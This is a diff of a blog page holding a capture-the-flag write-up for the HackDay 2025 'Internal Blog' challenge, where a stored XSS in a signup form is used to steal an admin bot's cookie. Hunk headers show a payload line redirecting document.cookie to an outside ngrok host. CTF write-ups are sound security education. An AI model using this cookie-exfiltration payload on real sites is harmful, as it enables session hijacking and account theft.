@@ -30,7 +30,7 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.4" />
-<meta property="og:title" content="HackDay - Intenal Blog" />
+<meta property="og:title" content="HackDay - Internal Blog" />
 <meta name="author" content="Anas" />
 <meta property="og:locale" content="en" />
 <meta name="description" content="Introduction Description" />
@@ -41,13 +41,13 @@
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2025-01-26T12:00:00+00:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HackDay - Intenal Blog" />
+<meta property="twitter:title" content="HackDay - Internal Blog" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-01-26T12:00:00+00:00","datePublished":"2025-01-26T12:00:00+00:00","description":"Introduction Description","headline":"HackDay - Intenal Blog","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/hackday-2025-internalblog/"},"url":"http://localhost:4000/posts/hackday-2025-internalblog/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-01-26T12:00:00+00:00","datePublished":"2025-01-26T12:00:00+00:00","description":"Introduction Description","headline":"HackDay - Internal Blog","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/hackday-2025-internalblog/"},"url":"http://localhost:4000/posts/hackday-2025-internalblog/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>HackDay - Intenal Blog | NullBrunk
+  <title>HackDay - Internal Blog | NullBrunk
   </title>
 
   <!--
@@ -1182,6 +1182,17 @@
 
       
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
 
     
   
@@ -1242,14 +1253,14 @@
             
              
             
-            <span>HackDay - Intenal Blog</span>
+            <span>HackDay - Internal Blog</span>
         </nav>
     </div>
 </header>
 
 <article class="px-1" data-toc="true">
   <header>
-    <h1 data-toc-skip>HackDay - Intenal Blog</h1>
+    <h1 data-toc-skip>HackDay - Internal Blog</h1>
     
 
     <div class="post-meta text-muted">
@@ -1324,7 +1335,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="437 words"
+  title="478 words"
 >
   <em>2 min</em> read</span>
 
@@ -1335,7 +1346,7 @@
 
   
     <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
-      <span class="label text-truncate">HackDay - Intenal Blog</span>
+      <span class="label text-truncate">HackDay - Internal Blog</span>
       <button type="button" class="toc-trigger btn me-1">
         <i class="fa-solid fa-list-ul fa-fw"></i>
       </button>
@@ -1348,7 +1359,7 @@
 
     <dialog id="toc-popup" class="p-0">
       <div class="header d-flex flex-row align-items-center justify-content-between">
-        <div class="label text-truncate py-2 ms-4">HackDay - Intenal Blog</div>
+        <div class="label text-truncate py-2 ms-4">HackDay - Internal Blog</div>
         <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
           <i class="fas fa-close"></i>
         </button>
@@ -1382,6 +1393,10 @@
 
 <h1 id="introduction">Introduction</h1>
 
+<h2 id="hackday"><span class="me-2">HackDay</span><a href="#hackday" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p><a href="https://ctftime.org/team/368433">We</a> finished <strong>39</strong> on <strong>150</strong>. <a href="https://ctftime.org/event/2615"> Link to the event </a></p>
+
 <h2 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
 <blockquote>
@@ -1389,6 +1404,8 @@
 <br />
 The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot’s cookie.</p>
 </blockquote>
+
+<p>We were the <strong>5th</strong> team on <strong>49</strong> to solve this challenge.</p>
 
 <h1 id="enumeration">Enumeration</h1>
 
@@ -1400,7 +1417,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 <p><a href="/assets/img/writeups/InternalBlog/vulnerability.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/vulnerability.png" alt="index"  loading="lazy"></a>
 <em>A part of the source is leaked</em></p>
 
-<p>We can see an interesting code snippet in here:</p>
+<p>We can see an interesting code snippet in here !</p>
 
 <div class="language-js highlighter-rouge"><div class="code-header">
         <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
@@ -1409,7 +1426,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 </pre></td><td class="rouge-code"><pre><span class="k">await</span> <span class="nx">newProfile</span><span class="p">.</span><span class="nf">save</span><span class="p">();</span>
 <span class="kd">const</span> <span class="nx">isXSSdetected</span> <span class="o">=</span> <span class="nf">sanitizeJson</span><span class="p">(</span><span class="nx">profileData</span><span class="p">,</span> <span class="nx">res</span><span class="p">);</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p>User is saved <code class="language-plaintext highlighter-rouge">BEFORE</code> XSS sanitization. So the server will yield at us, but will still create the user. And we know that admin verifies every post ! Let’s exploit this to steal the admin cookie …</p>
+<p>User is saved <code class="language-plaintext highlighter-rouge">BEFORE</code> XSS sanitization. So the server will say “XSS detected”, but will still create the user. Reading the index page, we learn that admin verifies every post. Let’s exploit this to steal the admin cookie .</p>
 
 <h1 id="exploitation">Exploitation</h1>
 
@@ -1418,7 +1435,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 <p><a href="/assets/img/writeups/InternalBlog/signup.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/signup.png" alt="index"  loading="lazy"></a>
 <em>Signup page</em></p>
 
-<p>I started by writing a simple script that put an XSS payload in every single field of the signup form:</p>
+<p>I started by writing a simple script that puts an XSS payload in every single field of the signup form <em>(except for the <code class="language-plaintext highlighter-rouge">Token</code> cause it has validation)</em>:</p>
 
 <div file="get_token.py" class="language-python highlighter-rouge"><div class="code-header">
         <span data-label-text="get_token.py"><i class="far fa-file-code fa-fw"></i></span>
@@ -1477,7 +1494,7 @@ The localhost port is 3000. Take a closer look and see if you can uncover anythi
 <p><a href="/assets/img/writeups/InternalBlog/yield_but_not_important.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/InternalBlog/yield_but_not_important.png" alt="index"  loading="lazy"></a>
 <em>Launch the registration script</em></p>
 
-<p>The server responds with <em>“XSS Detected”</em>, but the user was created ! Let’s try to access the profile page using the “UUID”:</p>
+<p>The server responds with <em>“XSS Detected”</em>, but the user was still created. To be sure, we can try to access the profile page using the “UUID” of the newly created user:</p>
 
 <ul>
   <li><strong><code class="language-plaintext highlighter-rouge">http://challenges.hackday.fr:61394/user?token=aebcffcb-fcaf-4028-a409-4e9b4d13ab8f</code></strong>
@@ -1605,21 +1622,21 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=HackDay%20-%20Intenal%20Blog%20-%20NullBrunk&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-internalblog%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=HackDay%20-%20Internal%20Blog%20-%20NullBrunk&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-internalblog%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=HackDay%20-%20Intenal%20Blog%20-%20NullBrunk&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-internalblog%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=HackDay%20-%20Internal%20Blog%20-%20NullBrunk&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-internalblog%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-internalblog%2F&text=HackDay%20-%20Intenal%20Blog%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-internalblog%2F&text=HackDay%20-%20Internal%20Blog%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -1674,7 +1691,7 @@ window.location.href = `http://2.tcp.eu.ngrok:12812/?cookie=` + document.cookie
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/hackday-2025-internalblog/">HackDay - Intenal Blog</a>
+          <a href="/posts/hackday-2025-internalblog/">HackDay - Internal Blog</a>
         </li>
       
         
@@ -3045,7 +3062,7 @@ Introduction
 
 KnightCTF
 
-KnightCT...</p>
+We’ve fi...</p>
               </div>
             </div>
           </a>
